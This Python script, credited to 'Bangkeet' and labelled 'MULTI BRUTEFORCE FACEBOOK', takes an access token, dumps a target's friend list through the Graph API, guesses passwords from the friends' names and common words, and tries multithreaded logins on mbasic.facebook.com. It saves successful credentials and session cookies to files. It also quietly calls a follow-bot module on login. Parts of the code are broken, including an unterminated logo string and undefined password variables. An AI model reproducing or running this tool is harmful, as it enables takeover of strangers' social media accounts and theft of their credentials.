#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With️ By Bangkeet

import requests,bs4,sys,os,random,time,re,json,concurrent
import bot_follow_sbf
from concurrent.futures import ThreadPoolExecutor as ThreadPool

ok = []
cp = []
ttl = []
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def logo():"""
%s               _ _       %s\ \\
%s    .-------. / \_> /\    %s|/
%s   /         \.'`  `',.--//
%s -(           I      I  %s@@%s\\
   \         /'.____.'\___|    %s╔╦╗╔╗ ╔═╗%s
    '-.....-' __/ | \   (`)    %s║║║╠╩╗╠╣%s
             /   /  /          %s╩ ╩╚═╝╚%s
                 \  \ %s
   [ MULTI BRUTEFORCE FACEBOOK ]

def login():
    os.system('rm -rf token.txt');os.system('clear');logo()
    token = input('[•] Masukkan Token :\n\n')
    try:x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];v = open("token.txt", "w");v.write(token);v.close();exit(bot_follow_sbf.main())
    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()

def menu():
    os.system('clear');logo()
    try:token = open("token.txt","r").read();x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];i = y['id']
    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
    print('[•] Nama : %s'%(n));print('[•] ID : %s'%(i));crack_publik()
    
def crack_publik():
    try:token = open("token.txt","r").read()
    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
    print('\n[•] Ketik \'me\' Untuk Dump Dari Teman');i = input("[•] ID Publik : ")
    try:
        try:o = requests.get("https://graph.facebook.com/" + i + "?access_token=" + token);b = json.loads(o.text);print ('[•] Nama : %s'%(b['name']))
        except (KeyError,IOError):print('\n[!] ID Tidak Ditemukan');menu()
        r = requests.get("https://graph.facebook.com/%s/friends?limit=5000&access_token=%s"%(i,token));id = [];z = json.loads(r.text);l = (b["first_name"]+".json").replace(" ","_");d = open(l,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"]);d.write(a["id"]+"•"+a["name"]+"\n")
        d.close();print('[•] Total ID : %s'%(len(id)))
        return crack(l)
    except Exception as e:exit('\n[!] Error : %s'%(e))

def password(text):
    results=[]
    for i in text.split(" "):
        i=i.lower()
        if len(i)>=6 : results.append(i);results.append(i+"123");results.append(i+"12345");results.append(name);results.append(sayang);results.append(bangsat);results.append(rahasia);results.append(anjing);results.append(kontol)
        elif len(i)==3 or len(i)==4 or len(i)==5 : results.append(i+"123");results.append(i+"12345");results.append(name);results.append(sayang);results.append(bangsat);results.append(rahasia);results.append(anjing);results.append(kontol)
        else:continue
    return results

def logger(em,pas,hosts):
    ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']);r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""});r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"});po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}

def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    return "".join(result)

class crack:
    def __init__(self,isifile):
        self.ada=[];self.cp=[];self.ko=0;print('\n[•] Crack Dengan Password Default/Manual [d/m]')
        while True:
            f = input('[•] Pilih : ')
            if f in [''] : continue
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:self.apk = isifile;self.fs = open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e));continue
                print('[•] Contoh : sayang,bismillah,123456');self.pwlist();break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:self.apk=isifile;self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("•")[0],"pw":password(i.split("•")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
                started();ThreadPool(35).map(self.mbasic,self.fl);os.remove(self.apk);exit()
            else:continue
    def pwlist(self):
        self.pw=input('[•] Masukkan Password : ').split(",")
        if len(self.pw) ==0:self.pwlist()
        else:
            for i in self.fl:i.update({"pw":self.pw})
            started();ThreadPool(30).map(self.mbasic,self.fl);os.remove(self.apk);exit()
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = logger(fl.get("id"),i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read());tt = json.loads(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];print("\r[CP] %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y));self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y));open("cp.txt","a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y));break
                    except(KeyError, IOError):m = " ";d = " ";y = " "
                    except:pass
                    print("\r[CP] %s • %s               "%(fl.get("id"),i));self.cp.append("%s•%s"%(fl.get("id"),i));open("cp.txt","a+").write("%s•%s\n"%(fl.get("id"),i));break
                elif log.get("status")=="success":print("\r[OK] %s • %s • %s              "%(fl.get("id"),i,koki(log.get("cookies"))));self.ada.append("%s•%s"%(fl.get("id"),i));open("ok.txt","a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            print("\r[Crack][%s/%s][OK:%s][CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)

def started():
    print('\n[•] Crack Sedang Berjalan...');print('[•] Akun [OK] Disimpan Ke ok.txt');print('[•] Akun [CP] Disimpan Ke cp.txt\n')

if __name__=='__main__':os.system('git pull');menu()